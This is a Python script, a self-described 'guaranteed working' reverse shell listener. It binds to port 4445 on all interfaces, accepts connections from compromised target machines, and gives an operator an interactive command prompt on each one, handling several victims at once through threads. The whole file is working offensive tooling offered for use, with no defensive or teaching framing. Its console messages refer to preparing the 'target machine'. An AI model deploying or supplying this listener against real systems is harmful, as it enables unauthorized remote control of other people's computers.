#!/usr/bin/env python3
"""
GUARANTEED WORKING Reverse Shell Listener
"""

import socket
import sys
import threading
import time

def handle_shell(client_socket, address):
    print(f"\n[✅] CLEAN SHELL from {address}")
    print("[+] Commands will work now!\n")
    
    client_socket.settimeout(10.0)
    
    try:
        # Clear any corrupted initial data
        try:
            client_socket.recv(1024, socket.MSG_DONTWAIT)
        except:
            pass
        
        # Wait for clean shell
        time.sleep(2)
        
        while True:
            try:
                # Send command prompt
                client_socket.send(b"$ ")
                
                # Wait for output
                time.sleep(1)
                
                # Receive all available output
                output = b""
                client_socket.settimeout(2.0)
                while True:
                    try:
                        chunk = client_socket.recv(4096)
                        if chunk:
                            output += chunk
                        else:
                            break
                    except socket.timeout:
                        break
                    except:
                        break
                
                if output:
                    clean_output = output.decode('utf-8', errors='ignore')
                    if clean_output.strip():
                        print(clean_output, end='')
                
                # Get command from user
                try:
                    cmd = input().strip()
                    if cmd.lower() == 'exit':
                        break
                    client_socket.send((cmd + "\n").encode())
                except EOFError:
                    break
                except KeyboardInterrupt:
                    break
                    
            except socket.timeout:
                continue
            except Exception as e:
                print(f"\n[!] Error: {e}")
                break
                
    except Exception as e:
        print(f"\n[!] Shell disconnected: {e}")
    finally:
        client_socket.close()
        print("\n[!] Shell connection closed")

def start_listener(port=4445):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    
    print(f"[*] LISTENING on port {port}")
    print("[*] Waiting for clean reverse shells...")
    print("[*] Make sure to CLEAN the target machine first!\n")
    
    try:
        while True:
            client_socket, address = server.accept()
            print(f"[+] Connection from {address}")
            thread = threading.Thread(target=handle_shell, args=(client_socket, address))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        server.close()

if __name__ == "__main__":
    start_listener(4445)
